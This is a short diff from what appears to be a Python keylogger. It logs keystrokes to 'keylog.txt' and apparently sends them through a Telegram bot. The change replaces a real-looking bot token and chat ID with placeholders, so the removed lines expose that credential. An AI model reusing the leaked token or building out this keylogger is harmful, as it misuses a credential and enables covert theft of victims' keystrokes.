@@ -5,8 +5,8 @@ import requests
 
 # Configuration
 LOG_FILE = "keylog.txt"
-CHAT_ID = "1380865447z"
-BOT_TOKEN = "7073587591:AAGEJyvFhbvHzvlEG4UwPsSkFG2iWvXg8uI"
+CHAT_ID = "YOUR_CHAT_ID"
+BOT_TOKEN = "YOUR_BOT_TOKEN"
 
 # Function to send message to Telegram
 def send_message(message):
